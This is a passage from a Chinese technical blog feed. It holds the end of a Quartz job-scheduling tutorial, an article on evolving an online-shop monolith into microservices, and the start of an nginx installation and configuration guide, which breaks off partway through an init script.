Days-of-Week 取值为 1-7 或者 SUN, MON, TUE, WED, THU, FRI, SAT
每个字段可以取单个值，多个值，或一个范围，例如 Day-of-Week 可取值为”MON，TUE，SAT”,”MON-FRI”或者”TUE-THU，SUN”。
通配符 表示该字段可接受任何可能取值。例如 Month 字段赋值 表示每个月，Day-of-Week 字段赋值 * 表示一周的每天。
/ 表示开始时刻与间隔时段。例如 Minutes 字段赋值 2/10 表示在一个小时内每 20 分钟执行一次，从第 2 分钟开始。
? 仅适用于 Day-of-Month 和 Day-of-Week。? 表示对该字段不指定特定值。适用于需要对这两个字段中的其中一个指定值，而对另一个不指定值的情况。一般情况下，这两个字段只需对一个赋值。
L 仅适用于 Day-of-Month 和 Day-of-Week。L 用于 Day-of-Month 表示该月最后一天。L 单独用于 Day-of-Week 表示周六，否则表示一个月最后一个星期几，例如 5L 或者 THUL 表示该月最后一个星期四。
W 仅适用于 Day-of-Month，表示离指定日期最近的一个工作日，例如 Day-of-Month 赋值为 10W 表示该月离 10 号最近的一个工作日。
仅适用于 Day-of-Week，表示该月第 XXX 个星期几。例如 Day-of-Week 赋值为 5#2 或者 THU#2，表示该月第二个星期四。
CronTrigger 的使用如下：
CronTrigger cronTrigger &#x3D; new CronTrigger(&quot;myTrigger&quot;, &quot;myGroup&quot;);
try &#123;
    cronTrigger.setCronExpression(&quot;0 0&#x2F;30 20-13 ? * MON-WED,SAT&quot;);
&#125; catch (Exception e) &#123;
    e.printStackTrace();
&#125;

Job 与 Trigger 的松耦合设计是 Quartz 的一大特点，其优点在于同一个 Job 可以绑定多个不同的 Trigger，同一个 Trigger 也可以调度多个 Job，灵活性很强。
Listener除了上述基本的调度功能，Quartz 还提供了 listener 的功能。主要包含三种 listener：JobListener，TriggerListener 以及 SchedulerListener。当系统发生故障，相关人员需要被通知时，Listener 便能发挥它的作用。最常见的情况是，当任务被执行时，系统发生故障，Listener 监听到错误，立即发送邮件给管理员。下面给出 JobListener 的实例：
清单 7. JobListener 的实现import org.quartz.JobExecutionContext;
import org.quartz.JobExecutionException;
import org.quartz.JobListener;
import org.quartz.SchedulerException;

public class MyListener implements JobListener&#123;

    @Override
    public String getName() &#123;
        return &quot;My Listener&quot;;
    &#125;
    @Override
    public void jobWasExecuted(JobExecutionContext context, JobExecutionException jobException) &#123;
        if(jobException !&#x3D; null)&#123;
            try &#123;
                &#x2F;&#x2F; 停止Scheduler
                context.getScheduler().shutdown();
                System.out.println(&quot;Error occurs when executing jobs, shut down the scheduler &quot;);
                &#x2F;&#x2F; 给管理员发送邮件...
            &#125; catch (SchedulerException e) &#123;
                e.printStackTrace();
            &#125;
        &#125;
    &#125;
&#125;

从清单 7 可以看出，使用者只需要创建一个 JobListener 的继承类，重载需要触发的方法即可。当然，需要将 listener 的实现类注册到 Scheduler 和 JobDetail 中：
sched.addJobListener(new MyListener());
jobDetail.addJobListener(&quot;My Listener&quot;); &#x2F;&#x2F; listener 的名字

使用者也可以将 listener 注册为全局 listener，这样便可以监听 scheduler 中注册的所有任务 :
sched.addGlobalJobListener(new MyListener());

为了测试 listener 的功能，可以在 job 的 execute 方法中强制抛出异常。清单 7 中，listener 接收到异常，将 job 所在的 scheduler 停掉，阻止后续的 job 继续执行。scheduler、jobDetail 等信息都可以从 listener 的参数 context 中检索到。
清单 7 的输出结果为：

“` Generating report – myJob.myJob, type =FULL Tue Feb 15 18:


转载：https://developer.ibm.com/zh/articles/j-lo-taskschedule/

]]></content>
      <tags>
        <tag>任务调度</tag>
        <tag>Java</tag>
        <tag>Quartz</tag>
      </tags>
  </entry>
  <entry>
    <title>微服务架构-入门理解</title>
    <url>/2021/04/09/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%9E%B6%E6%9E%84-%E5%85%A5%E9%97%A8%E7%90%86%E8%A7%A3/</url>
    <content><![CDATA[本文将介绍微服务架构和相关的组件，介绍他们是什么以及为什么要使用微服务架构和这些组件。本文侧重于简明地表达微服务架构的全局图景，因此不会涉及具体如何使用组件等细节。
要理解微服务，首先要先理解不是微服务的那些。通常跟微服务相对的是单体应用，即将所有功能都打包成在一个独立单元的应用程序。从单体应用到微服务并不是一蹴而就的，这是一个逐渐演变的过程。本文将以一个网上超市应用为例来说明这一过程。


最初的需求几年前，小明和小皮一起创业做网上超市。小明负责程序开发，小皮负责其他事宜。当时互联网还不发达，网上超市还是蓝海。只要功能实现了就能随便赚钱。所以他们的需求很简单，只需要一个网站挂在公网，用户能够在这个网站上浏览商品、购买商品；另外还需一个管理后台，可以管理商品、用户、以及订单数据。
我们整理一下功能清单：

网站
  用户注册、登录功能
  商品展示
  下单


管理后台
  用户管理
  商品管理
  订单管理



由于需求简单，小明左手右手一个慢动作，网站就做好了。管理后台出于安全考虑，不和网站做在一起，小明右手左手慢动作重播，管理网站也做好了。总体架构图如下：

小明挥一挥手，找了家云服务部署上去，网站就上线了。上线后好评如潮，深受各类肥宅喜爱。小明小皮美滋滋地开始躺着收钱。
随着业务发展……好景不长，没过几天，各类网上超市紧跟着拔地而起，对小明小皮造成了强烈的冲击。
在竞争的压力下，小明小皮决定开展一些营销手段：

  开展促销活动。比如元旦全场打折，春节买二送一，情人节狗粮优惠券等等。
  拓展渠道，新增移动端营销。除了网站外，还需要开发移动端 APP，微信小程序等。
  精准营销。利用历史数据对用户进行分析，提供个性化服务。
  ……

这些活动都需要程序开发的支持。小明拉了同学小红加入团队。小红负责数据分析以及移动端相关开发。小明负责促销活动相关功能的开发。
因为开发任务比较紧迫，小明小红没有好好规划整个系统的架构，随便拍了拍脑袋，决定把促销管理和数据分析放在管理后台里，微信和移动端 APP 另外搭建。通宵了几天后，新功能和新应用基本完工。这时架构图如下：

这一阶段存在很多不合理的地方：

  网站和移动端应用有很多相同业务逻辑的重复代码。
  数据有时候通过数据库共享，有时候通过接口调用传输。接口调用关系杂乱。
  单个应用为了给其他应用提供接口，渐渐地越改越大，包含了很多本来就不属于它的逻辑。应用边界模糊，功能归属混乱。
  管理后台在一开始的设计中保障级别较低。加入数据分析和促销管理相关功能后出现性能瓶颈，影响了其他应用。
  数据库表结构被多个应用依赖，无法重构和优化。
  所有应用都在一个数据库上操作，数据库出现性能瓶颈。特别是数据分析跑起来的时候，数据库性能急剧下降。
  开发、测试、部署、维护愈发困难。即使只改动一个小功能，也需要整个应用一起发布。有时候发布会不小心带上了一些未经测试的代码，或者修改了一个功能后，另一个意想不到的地方出错了。为了减轻发布可能产生的问题的影响和线上业务停顿的影响，所有应用都要在凌晨三四点执行发布。发布后为了验证应用正常运行，还得盯到第二天白天的用户高峰期……
  团队出现推诿扯皮现象。关于一些公用的功能应该建设在哪个应用上的问题常常要争论很久，最后要么干脆各做各的，或者随便放个地方但是都不维护。

尽管有着诸多问题，但也不能否认这一阶段的成果：快速地根据业务变化建设了系统。不过紧迫且繁重的任务容易使人陷入局部、短浅的思维方式，从而做出妥协式的决策。在这种架构中，每个人都只关注在自己的一亩三分地，缺乏全局的、长远的设计。长此以往，系统建设将会越来越困难，甚至陷入不断推翻、重建的循环。
是时候做出改变了幸好小明和小红是有追求有理想的好青年。意识到问题后，小明和小红从琐碎的业务需求中腾出了一部分精力，开始梳理整体架构，针对问题准备着手改造。

要做改造，首先你需要有足够的精力和资源。如果你的需求方（业务人员、项目经理、上司等）很强势地一心追求需求进度，以致于你无法挪出额外的精力和资源的话，那么你可能无法做任何事……

在编程的世界中，最重要的便是抽象能力。微服务改造的过程实际上也是个抽象的过程。小明和小红整理了网上超市的业务逻辑，抽象出公用的业务能力，做成几个公共服务：

  用户服务
  商品服务
  促销服务
  订单服务
  数据分析服务

各个应用后台只需从这些服务获取所需的数据，从而删去了大量冗余的代码，就剩个轻薄的控制层和前端。这一阶段的架构如下：

这个阶段只是将服务分开了，数据库依然是共用的，所以一些烟囱式系统的缺点仍然存在：

 数据库成为性能瓶颈，并且有单点故障的风险。
 数据管理趋向混乱。即使一开始有良好的模块化设计，随着时间推移，总会有一个服务直接从数据库取另一个服务的数据的现象。
 数据库表结构可能被多个服务依赖，牵一发而动全身，很难调整。

如果一直保持共用数据库的模式，则整个架构会越来越僵化，失去了微服务架构的意义。因此小明和小红一鼓作气，把数据库也拆分了。所有持久化层相互隔离，由各个服务自己负责。另外，为了提高系统的实时性，加入了消息队列机制。架构如下：

完全拆分后各个服务可以采用异构的技术。比如数据分析服务可以使用数据仓库作为持久化层，以便于高效地做一些统计计算；商品服务和促销服务访问频率比较大，因此加入了缓存机制等。

还有一种抽象出公共逻辑的方法是把这些公共逻辑做成公共的框架库。这种方法可以减少服务调用的性能损耗。但是这种方法的管理成本非常高昂，很难保证所有应用版本的一致性。


数据库拆分也有一些问题和挑战：比如说跨库级联的需求，通过服务查询数据颗粒度的粗细问题等。但是这些问题可以通过合理的设计来解决。总体来说，数据库拆分是一个利大于弊的。

微服务架构还有一个技术外的好处，它使整个系统的分工更加明确，责任更加清晰，每个人专心负责为其他人提供更好的服务。在单体应用的时代，公共的业务功能经常没有明确的归属。最后要么各做各的，每个人都重新实现了一遍；要么是随机一个人（一般是能力比较强或者比较热心的人）做到他负责的应用里面。在后者的情况下，这个人在负责自己应用之外，还要额外负责给别人提供这些公共的功能——而这个功能本来是无人负责的，仅仅因为他能力较强 / 比较热心，就莫名地背锅（这种情况还被美其名曰能者多劳）。结果最后大家都不愿意提供公共的功能。长此以往，团队里的人渐渐变得各自为政，不再关心全局的架构设计。
从这个角度上看，使用微服务架构同时也需要组织结构做相应的调整。所以说做微服务改造需要管理者的支持。
改造完成后，小明和小红分清楚各自的锅。两人十分满意，一切就像是麦克斯韦方程组一样漂亮完美。
然而……
没有银弹春天来了，万物复苏，又到了一年一度的购物狂欢节。眼看着日订单数量蹭蹭地上涨，小皮小明小红喜笑颜开。可惜好景不长，乐极生悲，突然嘣的一下，系统挂了。
以往单体应用，排查问题通常是看一下日志，研究错误信息和调用堆栈。而微服务架构整个应用分散成多个服务，定位故障点非常困难。小明一个台机器一台机器地查看日志，一个服务一个服务地手工调用。经过十几分钟的查找，小明终于定位到故障点：促销服务由于接收的请求量太大而停止响应了。其他服务都直接或间接地会调用促销服务，于是也跟着宕机了。在微服务架构中，一个服务故障可能会产生雪崩效用，导致整个系统故障。其实在节前，小明和小红是有做过请求量评估的。按照预计，服务器资源是足以支持节日的请求量的，所以肯定是哪里出了问题。不过形势紧急，随着每一分每一秒流逝的都是白花花的银子，因此小明也没时间排查问题，当机立断在云上新建了几台虚拟机，然后一台一台地部署新的促销服务节点。几分钟的操作后，系统总算是勉强恢复正常了。整个故障时间内估计损失了几十万的销售额，三人的心在滴血……
事后，小明简单写了个日志分析工具（量太大了，文本编辑器几乎打不开，打开了肉眼也看不过来），统计了促销服务的访问日志，发现在故障期间，商品服务由于代码问题，在某些场景下会对促销服务发起大量请求。这个问题并不复杂，小明手指抖一抖，修复了这个价值几十万的 Bug。
问题是解决了，但谁也无法保证不会再发生类似的其他问题。微服务架构虽然逻辑设计上看是完美的，但就像积木搭建的华丽宫殿一样，经不起风吹草动。微服务架构虽然解决了旧问题，也引入了新的问题：

  微服务架构整个应用分散成多个服务，定位故障点非常困难。
  稳定性下降。服务数量变多导致其中一个服务出现故障的概率增大，并且一个服务故障可能导致整个系统挂掉。事实上，在大访问量的生产场景下，故障总是会出现的。
  服务数量非常多，部署、管理的工作量很大。
  开发方面：如何保证各个服务在持续开发的情况下仍然保持协同合作。
  测试方面：服务拆分后，几乎所有功能都会涉及多个服务。原本单个程序的测试变为服务间调用的测试。测试变得更加复杂。

小明小红痛定思痛，决心好好解决这些问题。对故障的处理一般从两方面入手，一方面尽量减少故障发生的概率，另一方面降低故障造成的影响。

监控 - 发现故障的征兆在高并发分布式的场景下，故障经常是突然间就雪崩式爆发。所以必须建立完善的监控体系，尽可能发现故障的征兆。
微服务架构中组件繁多，各个组件所需要监控的指标不同。比如 Redis 缓存一般监控占用内存值、网络流量，数据库监控连接数、磁盘空间，业务服务监控并发数、响应延迟、错误率等。因此如果做一个大而全的监控系统来监控各个组件是不大现实的，而且扩展性会很差。一般的做法是让各个组件提供报告自己当前状态的接口（metrics 接口），这个接口输出的数据格式应该是一致的。然后部署一个指标采集器组件，定时从这些接口获取并保持组件状态，同时提供查询服务。最后还需要一个 UI，从指标采集器查询各项指标，绘制监控界面或者根据阈值发出告警。
大部分组件都不需要自己动手开发，网络上有开源组件。小明下载了 RedisExporter 和 MySQLExporter，这两个组件分别提供了 Redis 缓存和 MySQL 数据库的指标接口。微服务则根据各个服务的业务逻辑实现自定义的指标接口。然后小明采用 Prometheus 作为指标采集器，Grafana 配置监控界面和邮件告警。这样一套微服务监控系统就搭建起来了：

定位问题 - 链路跟踪在微服务架构下，一个用户的请求往往涉及多个内部服务调用。为了方便定位问题，需要能够记录每个用户请求时，微服务内部产生了多少服务调用，及其调用关系。这个叫做链路跟踪。
我们用一个 Istio 文档里的链路跟踪例子来看看效果：


图片来自 Istio 文档

从图中可以看到，这是一个用户访问 productpage 页面的请求。在请求过程中，productpage 服务顺序调用了 details 和 reviews 服务的接口。而 reviews 服务在响应过程中又调用了 ratings 的接口。整个链路跟踪的记录是一棵树：

要实现链路跟踪，每次服务调用会在 HTTP 的 HEADERS 中记录至少记录四项数据：

  traceId：traceId 标识一个用户请求的调用链路。具有相同 traceId 的调用属于同一条链路。
  spanId：标识一次服务调用的 ID，即链路跟踪的节点 ID。
  parentId：父节点的 spanId。
  requestTime &amp; responseTime：请求时间和响应时间。

另外，还需要调用日志收集与存储的组件，以及展示链路调用的 UI 组件。

以上只是一个极简的说明，关于链路跟踪的理论依据可详见 Google 的 Dapper
了解了理论基础后，小明选用了 Dapper 的一个开源实现 Zipkin。然后手指一抖，写了个 HTTP 请求的拦截器，在每次 HTTP 请求时生成这些数据注入到 HEADERS，同时异步发送调用日志到 Zipkin 的日志收集器中。这里额外提一下，HTTP 请求的拦截器，可以在微服务的代码中实现，也可以使用一个网络代理组件来实现（不过这样子每个微服务都需要加一层代理）。
链路跟踪只能定位到哪个服务出现问题，不能提供具体的错误信息。查找具体的错误信息的能力则需要由日志分析组件来提供。
分析问题 - 日志分析日志分析组件应该在微服务兴起之前就被广泛使用了。即使单体应用架构，当访问数变大、或服务器规模增多时，日志文件的大小会膨胀到难以用文本编辑器进行访问，更糟的是它们分散在多台服务器上面。排查一个问题，需要登录到各台服务器去获取日志文件，一个一个地查找（而且打开、查找都很慢）想要的日志信息。
因此，在应用规模变大时，我们需要一个日志的 “搜索引擎”。以便于能准确的找到想要的日志。另外，数据源一侧还需要收集日志的组件和展示结果的 UI 组件：

小明调查了一下，使用了大名鼎鼎地 ELK 日志分析组件。ELK 是 Elasticsearch、Logstash 和 Kibana 三个组件的缩写。

  Elasticsearch：搜索引擎，同时也是日志的存储。
  Logstash：日志采集器，它接收日志输入，对日志进行一些预处理，然后输出到 Elasticsearch。
  Kibana：UI 组件，通过 Elasticsearch 的 API 查找数据并展示给用户。

最后还有一个小问题是如何将日志发送到 Logstash。一种方案是在日志输出的时候直接调用 Logstash 接口将日志发送过去。这样一来又（咦，为啥要用 “又”）要修改代码…… 于是小明选用了另一种方案：日志仍然输出到文件，每个服务里再部署个 Agent 扫描日志文件然后输出给 Logstash。
网关 - 权限控制，服务治理拆分成微服务后，出现大量的服务，大量的接口，使得整个调用关系乱糟糟的。经常在开发过程中，写着写着，忽然想不起某个数据应该调用哪个服务。或者写歪了，调用了不该调用的服务，本来一个只读的功能结果修改了数据……
为了应对这些情况，微服务的调用需要一个把关的东西，也就是网关。在调用者和被调用者中间加一层网关，每次调用时进行权限校验。另外，网关也可以作为一个提供服务接口文档的平台。
使用网关有一个问题就是要决定在多大粒度上使用：最粗粒度的方案是整个微服务一个网关，微服务外部通过网关访问微服务，微服务内部则直接调用；最细粒度则是所有调用，不管是微服务内部调用或者来自外部的调用，都必须通过网关。折中的方案是按照业务领域将微服务分成几个区，区内直接调用，区间通过网关调用。
由于整个网上超市的服务数量还不算特别多，小明采用的最粗粒度的方案：

服务注册于发现 - 动态扩容前面的组件，都是旨在降低故障发生的可能性。然而故障总是会发生的，所以另一个需要研究的是如何降低故障产生的影响。
最粗暴的（也是最常用的）故障处理策略就是冗余。一般来说，一个服务都会部署多个实例，这样一来能够分担压力提高性能，二来即使一个实例挂了其他实例还能响应。
冗余的一个问题是使用几个冗余？这个问题在时间轴上并没有一个切确的答案。根据服务功能、时间段的不同，需要不同数量的实例。比如在平日里，可能 4 个实例已经够用；而在促销活动时，流量大增，可能需要 40 个实例。因此冗余数量并不是一个固定的值，而是根据需要实时调整的。
一般来说新增实例的操作为：

 部署新实例
 将新实例注册到负载均衡或 DNS 上

操作只有两步，但如果注册到负载均衡或 DNS 的操作为人工操作的话，那事情就不简单了。想想新增 40 个实例后，要手工输入 40 个 IP 的感觉……
解决这个问题的方案是服务自动注册与发现。首先，需要部署一个服务发现服务，它提供所有已注册服务的地址信息的服务。DNS 也算是一种服务发现服务。然后各个应用服务在启动时自动将自己注册到服务发现服务上。并且应用服务启动后会实时（定期）从服务发现服务同步各个应用服务的地址列表到本地。服务发现服务也会定期检查应用服务的健康状态，去掉不健康的实例地址。这样新增实例时只需要部署新实例，实例下线时直接关停服务即可，服务发现会自动检查服务实例的增减。

服务发现还会跟客户端负载均衡配合使用。由于应用服务已经同步服务地址列表在本地了，所以访问微服务时，可以自己决定负载策略。甚至可以在服务注册时加入一些元数据（服务版本等信息），客户端负载则根据这些元数据进行流量控制，实现 A/B 测试、蓝绿发布等功能。
服务发现有很多组件可以选择，比如说 Zookeeper 、Eureka、Consul、Etcd 等。不过小明觉得自己水平不错，想炫技，于是基于 Redis 自己写了一个……
熔断、服务降级、限流熔断当一个服务因为各种原因停止响应时，调用方通常会等待一段时间，然后超时或者收到错误返回。如果调用链路比较长，可能会导致请求堆积，整条链路占用大量资源一直在等待下游响应。所以当多次访问一个服务失败时，应熔断，标记该服务已停止工作，直接返回错误。直至该服务恢复正常后再重新建立连接。


图片来自《微服务设计》

服务降级当下游服务停止工作后，如果该服务并非核心业务，则上游服务应该降级，以保证核心业务不中断。比如网上超市下单界面有一个推荐商品凑单的功能，当推荐模块挂了后，下单功能不能一起挂掉，只需要暂时关闭推荐功能即可。
限流一个服务挂掉后，上游服务或者用户一般会习惯性地重试访问。这导致一旦服务恢复正常，很可能因为瞬间网络流量过大又立刻挂掉，在棺材里重复着仰卧起坐。因此服务需要能够自我保护——限流。限流策略有很多，最简单的比如当单位时间内请求数过多时，丢弃多余的请求。另外，也可以考虑分区限流。仅拒绝来自产生大量请求的服务的请求。例如商品服务和订单服务都需要访问促销服务，商品服务由于代码问题发起了大量请求，促销服务则只限制来自商品服务的请求，来自订单服务的请求则正常响应。

测试微服务架构下，测试分为三个层次：

 端到端测试：覆盖整个系统，一般在用户界面机型测试。
 服务测试：针对服务接口进行测试。
 单元测试：针对代码单元进行测试。

三种测试从上到下实施的容易程度递增，但是测试效果递减。端到端测试最费时费力，但是通过测试后我们对系统最有信心。单元测试最容易实施，效率也最高，但是测试后不能保证整个系统没有问题。

由于端到端测试实施难度较大，一般只对核心功能做端到端测试。一旦端到端测试失败，则需要将其分解到单元测试：则分析失败原因，然后编写单元测试来重现这个问题，这样未来我们便可以更快地捕获同样的错误。
服务测试的难度在于服务会经常依赖一些其他服务。这个问题可以通过 Mock Server 解决：

单元测试大家都很熟悉了。我们一般会编写大量的单元测试（包括回归测试）尽量覆盖所有代码。
微服务框架指标接口、链路跟踪注入、日志引流、服务注册发现、路由规则等组件以及熔断、限流等功能都需要在应用服务上添加一些对接代码。如果让每个应用服务自己实现是非常耗时耗力的。基于 DRY 的原则，小明开发了一套微服务框架，将与各个组件对接的代码和另外一些公共代码抽离到框架中，所有的应用服务都统一使用这套框架进行开发。
使用微服务框架可以实现很多自定义的功能。甚至可以将程序调用堆栈信息注入到链路跟踪，实现代码级别的链路跟踪。或者输出线程池、连接池的状态信息，实时监控服务底层状态。
使用统一的微服务框架有一个比较严重的问题：框架更新成本很高。每次框架升级，都需要所有应用服务配合升级。当然，一般会使用兼容方案，留出一段并行时间等待所有应用服务升级。但是如果应用服务非常多时，升级时间可能会非常漫长。并且有一些很稳定几乎不更新的应用服务，其负责人可能会拒绝升级…… 因此，使用统一微服务框架需要完善的版本管理方法和开发管理规范。
另一条路 - Service Mesh另一种抽象公共代码的方法是直接将这些代码抽象到一个反向代理组件。每个服务都额外部署这个代理组件，所有出站入站的流量都通过该组件进行处理和转发。这个组件被称为 Sidecar。

Sidecar 不会产生额外网络成本。Sidecar 会和微服务节点部署在同一台主机上并且共用相同的虚拟网卡。所以 sidecar 和微服务节点的通信实际上都只是通过内存拷贝实现的。



图片来自：Pattern: Service Mesh

Sidecar 只负责网络通信。还需要有个组件来统一管理所有 sidecar 的配置。在 Service Mesh 中，负责网络通信的部分叫数据平面（data plane），负责配置管理的部分叫控制平面（control plane）。数据平面和控制平面构成了 Service Mesh 的基本架构。


图片来自：Pattern: Service Mesh

Sevice Mesh 相比于微服务框架的优点在于它不侵入代码，升级和维护更方便。它经常被诟病的则是性能问题。即使回环网络不会产生实际的网络请求，但仍然有内存拷贝的额外成本。另外有一些集中式的流量处理也会影响性能。
结束、也是开始微服务不是架构演变的终点。往细走还有 Serverless、FaaS 等方向。另一方面也有人在唱合久必分分久必合，重新发现单体架构……
不管怎样，微服务架构的改造暂时告一段落了。小明满足地摸了摸日益光滑的脑袋，打算这个周末休息一下约小红喝杯咖啡。

原文链接：https://www.cnblogs.com/skabyy/p/11396571.html

]]></content>
      <tags>
        <tag>微服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title>Nginx最全操作总结</title>
    <url>/2021/07/07/Nginx%E6%9C%80%E5%85%A8%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[
原文地址：https://zhuanlan.zhihu.com/p/384752564

作者：chrootliu，腾讯 QQ 音乐前端开发工程师

本文将会从：安装 -&gt; 全局配置 -&gt; 常用的各种配置 来书写，其中常用配置写的炒鸡详细，需要的童鞋可以直接滑倒相应的位置查看。

安装 nginx下载 nginx 的压缩包文件到根目录，官网下载地址：https://nginx.org/download/
yum update #更新系统软件
cd &#x2F;
wget nginx.org&#x2F;download&#x2F;nginx-1.17.2.tar.gz

解压 tar.gz 压缩包文件，进去 nginx-1.17.2
tar -xzvf nginx-1.17.2.tar.gz
cd nginx-1.17.2

进入文件夹后进行配置检查
.&#x2F;configure

通过安装前的配置检查，发现有报错。检查中发现一些依赖库没有找到，这时候需要先安装 nginx 的一些依赖库
yum -y install pcre* #安装使nginx支持rewrite
yum -y install gcc-c++
yum -y install zlib*
yum -y install openssl openssl-devel

再次进行检查操作 ./configure 没发现报错显示，接下来进行编译并安装的操作
# 检查模块支持
.&#x2F;configure  --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx  --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_addition_module --with-http_sub_module --with-http_dav_module --with-http_flv_module --with-http_mp4_module --with-http_gunzip_module --with-http_gzip_static_module --with-http_auth_request_module --with-http_random_index_module --with-http_secure_link_module --with-http_degradation_module --with-http_slice_module --with-http_stub_status_module --with-mail --with-mail_ssl_module --with-stream --with-stream_ssl_module --with-stream_realip_module --with-stream_ssl_preread_module --with-threads --user&#x3D;www --group&#x3D;www

这里得特别注意下，你以后需要用到的功能模块是否存在，不然以后添加新的包会比较麻烦。
查看默认安装的模块支持
命令 ls nginx-1.17.2 查看 nginx 的文件列表，可以发现里面有一个 auto 的目录。
在这个 auto 目录中有一个 options 文件，这个文件里面保存的就是 nginx 编译过程中的所有选项配置。
通过命令：cat nginx-1.17.2/auto/options | grep YES就可以查看
nginx 编译安装时，怎么查看安装模块
编译并安装
make &amp;&amp; make install

这里需要注意，模块的支持跟后续的 nginx 配置有关，比如 SSL，gzip 压缩等等，编译安装前最好检查需要配置的模块存不存在。
查看 nginx 安装后在的目录，可以看到已经安装到 /usr/local/nginx 目录了
whereis nginx
$nginx: &#x2F;usr&#x2F;local&#x2F;nginx

启动 nginx 服务
cd &#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;
.&#x2F;nginx

服务启动的时候报错了：nginx: [emerg] bind() to 0.0.0.0:80 failed (98: Address already in use) ，通过命令查看本机网络地址和端口等一些信息，找到被占用的 80 端口 netstat -ntpl 的 tcp 连接，并杀死进程 (kill 进程 pid)
netstat -ntpl
kill 进程PID

继续启动 nginx 服务，启动成功
.&#x2F;nginx

在浏览器直接访问 ip 地址，页面出现 Welcome to Nginx! 则安装成功。


nginx 配置基本结构main        # 全局配置，对全局生效
├── events  # 配置影响 nginx 服务器或与用户的网络连接
├── http    # 配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置
│   ├── upstream # 配置后端服务器具体地址，负载均衡配置不可或缺的部分
│   ├── server   # 配置虚拟主机的相关参数，一个 http 块中可以有多个 server 块
│   ├── server
│   │   ├── location  # server 块可以包含多个 location 块，location 指令用于匹配 uri
│   │   ├── location
│   │   └── ...
│   └── ...
└── ...

主要配置含义
  main:nginx 的全局配置，对全局生效。
  events: 配置影响 nginx 服务器或与用户的网络连接。
  http：可以嵌套多个 server，配置代理，缓存，日志定义等绝大多数功能和第三方模块的配置。
  server：配置虚拟主机的相关参数，一个 http 中可以有多个 server。
  location：配置请求的路由，以及各种页面的处理情况。
  upstream：配置后端服务器具体地址，负载均衡配置不可或缺的部分。

nginx.conf 配置文件的语法规则
 配置文件由指令与指令块构成
 每条指令以 “;” 分号结尾，指令与参数间以空格符号分隔
 指令块以 {} 大括号将多条指令组织在一起
 include 语句允许组合多个配置文件以提升可维护性
 通过 # 符号添加注释，提高可读性
 通过 $ 符号使用变量
 部分指令的参数支持正则表达式，例如常用的 location 指令

内置变量nginx 常用的内置全局变量，你可以在配置中随意使用：



TCP
UDP



$host
请求信息中的 Host，如果请求中没有Host行，则等于设置的服务器名


$request_method
客户端请求类型,如 GET、POST


$remote_addr
客户端的 IP 地址


$args
请求中的参数


$content_length
请求头中的 Content-length 字段


$http_user_agent
客户端 agent 信


$httpcookie
客户端 cookie 信息


$remote_port
客户端的端口


$server_protoco
请求使用的协议，如HTTP/1.1


$server_addr
服务器地址


$server_name
服务器名称


$server_port
服务器的端口号


常用命令这里列举几个常用的命令：
nginx -s reload  # 向主进程发送信号，重新加载配置文件，热重启
nginx -s reopen  # 重启 Nginx
nginx -s stop    # 快速关闭
nginx -s quit    # 等待工作进程处理完成后关闭
nginx -T         # 查看当前 Nginx 最终的配置
nginx -t -c &lt;配置路径&gt;  # 检查配置是否有问题，如果已经在配置目录，则不需要 -c

以上命令通过 nginx -h 就可以查看到，还有其它不常用这里未列出。
Linux 系统应用管理工具 systemd 关于 nginx 的常用命令：
systemctl start nginx    # 启动 Nginx
systemctl stop nginx     # 停止 Nginx
systemctl restart nginx  # 重启 Nginx
systemctl reload nginx   # 重新加载 Nginx，用于修改配置后
systemctl enable nginx   # 设置开机启动 Nginx
systemctl disable nginx  # 关闭开机启动 Nginx
systemctl status nginx   # 查看 Nginx 运行状态

配置 nginx 开机自启利用 systemctl 命令：
如果用 yum install 命令安装的 nginx，yum 命令会自动创建 nginx.service 文件，直接用命令:
systemctl enable nginx   # 设置开机启动 Nginx
systemctl disable nginx  # 关闭开机启动 Nginx

就可以设置开机自启，否则需要在系统服务目录里创建 nginx.service 文件。
创建并打开 nginx.service 文件：
vi &#x2F;lib&#x2F;systemd&#x2F;system&#x2F;nginx.service

内容如下：
[Unit]
Description&#x3D;nginx
After&#x3D;network.target

[Service]
Type&#x3D;forking
ExecStart&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx
ExecReload&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx -s reload
ExecStop&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin&#x2F;nginx -s quit
PrivateTmp&#x3D;true

[Install]
WantedBy&#x3D;multi-user.target

:wq 保存退出，运行 systemctl daemon-reload 使文件生效。
这样便可以通过以下命令操作 nginx 了：
systemctl start nginx.service # 启动nginx服务
systemctl enable nginx.service # 设置开机启动
systemctl disable nginx.service # 停止开机自启动
systemctl status nginx.service # 查看服务当前状态
systemctl restart nginx.service # 重新启动服务
systemctl is-enabled nginx.service #查询服务是否开机启动

通过开机启动命令脚本实现开机自启
创建开机启动命令脚本文件：
vi &#x2F;etc&#x2F;init.d&#x2F;nginx

在这个 nginx 文件中插入一下启动脚本代码，启动脚本代码来源网络复制，实测有效：
#! &#x2F;bin&#x2F;bash
# chkconfig: - 85 15
PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;nginx
DESC&#x3D;&quot;nginx daemon&quot;
NAME&#x3D;nginx
DAEMON&#x3D;$PATH&#x2F;sbin&#x2F;$NAME
CONFIGFILE&#x3D;$PATH&#x2F;conf&#x2F;$NAME.conf
PIDFILE&#x3D;$PATH&#x2F;logs&#x2F;$NAME.pid
scriptNAME&#x3D;&#x2F;etc&#x2F;init.d&#x2F;$NAME
set -e
[ -x &quot;$DAEMON&quot; ] || exit 0
do_start() &#123;
$DAEMON -c $CONFIGFILE || echo -n &quot;nginx already running&quot;
&#125;
do_stop() &#123;
$DAEMON -s stop || echo -n &quot;nginx not running&quot;
&#125;
do_reload() &#123;
$DAEMON -s reload || echo -n &quot;nginx can&#39;t reload&quot;
&#125;
case &quot;$1&quot; in
start)
echo -n &quot;Starting $DESC: $NAME&quot;
do_start
echo &quot;.&quot;
;;
stop)
echo -n &quot;Stopping $DESC: $NAME&quot;
do_stop
echo &quot;.&quot;
;;
reload|graceful)
echo -n &quot;Reloading $DESC configuration...&quot;
do_reload
echo &quot;.&quot;
;;
restart)
